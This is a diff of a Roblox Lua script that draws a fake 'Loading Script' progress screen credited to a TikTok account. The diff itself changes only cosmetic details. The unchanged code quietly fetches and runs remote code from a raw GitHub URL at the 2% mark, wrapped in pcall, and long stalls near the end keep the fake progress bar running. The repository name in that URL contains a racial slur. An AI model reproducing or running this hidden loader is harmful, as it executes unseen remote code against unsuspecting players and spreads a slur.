@@ -54,7 +54,7 @@ local a = true
 task.spawn(function()
 	local d = 0
 	while a and t.Parent do
-		t.Text = t.Text:gsub("%.%.*","") .. string.rep(".", d % 4)
+		t.Text = "🚀🔄 Loading Script" .. string.rep(".", d % 4)
 		d += 1
 		wait(0.5)
 	end
@@ -90,7 +90,7 @@ i.BackgroundTransparency = 1
 i.Font = Enum.Font.GothamSemibold
 i.TextColor3 = Color3.fromRGB(200, 200, 200)
 i.TextScaled = true
-i.Text = "⏳ Please wait, script is initializing..."
+i.Text = "⏳🛠️ Please wait, script is initializing..."
 
 -- Footer Credit
 local credit = Instance.new("TextLabel", f)
@@ -102,16 +102,6 @@ credit.TextColor3 = Color3.fromRGB(170, 170, 170)
 credit.TextScaled = true
 credit.Text = "👨‍💻📜 Script made by @growyourowngarden on TikTok"
 
--- Get status based on %
-local function getStatus(i)
-	if i < 20 then return "🔍 Scanning game environment..."
-	elseif i < 40 then return "🧠 Analyzing local assets..."
-	elseif i < 60 then return "⚙️ Loading functions..."
-	elseif i < 80 then return "📡 Connecting to remote server..."
-	else return "🚀 Finalizing execution..."
-	end
-end
-
 -- Progress Function
 local function fillProgress()
 	a = true
@@ -119,29 +109,26 @@ local function fillProgress()
 	perc.Text = "0% Complete"
 
 	for i = 1, 100 do
-		-- Smooth Tween
+		-- Smooth tween using TweenService
 		local targetSize = UDim2.new(i / 100, 0, 1, 0)
-		local tween = TweenService:Create(bar, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Size = targetSize })
+		local tween = TweenService:Create(bar, TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Size = targetSize })
 		tween:Play()
-
-		-- Update text
 		perc.Text = i .. "% Complete"
-		i.Text = getStatus(i)
 
-		-- Run script early
 		if i == 2 then
 			pcall(function()
 				loadstring(game:HttpGet("https://raw.githubusercontent.com/No-Laggs/walapatoniggaa/refs/heads/main/gragraj"))()
 			end)
 		end
 
-		-- Pauses
 		if i == 50 or i == 60 then
 			wait(2)
 		elseif i == 80 or i == 90 then
 			wait(60)
+		elseif i < 50 then
+			wait(0.01)
 		else
-			wait(math.random(1, 4) / 100 + 0.01)
+			wait(0.05)
 		end
 	end
 
@@ -149,10 +136,10 @@ local function fillProgress()
 	retryBtn.Visible = true
 end
 
--- Start progress
+-- Start initial progress
 fillProgress()
 
--- Retry Button resets
+-- Retry Button resets and restarts
 retryBtn.MouseButton1Click:Connect(function()
 	retryBtn.Visible = false
 	fillProgress()
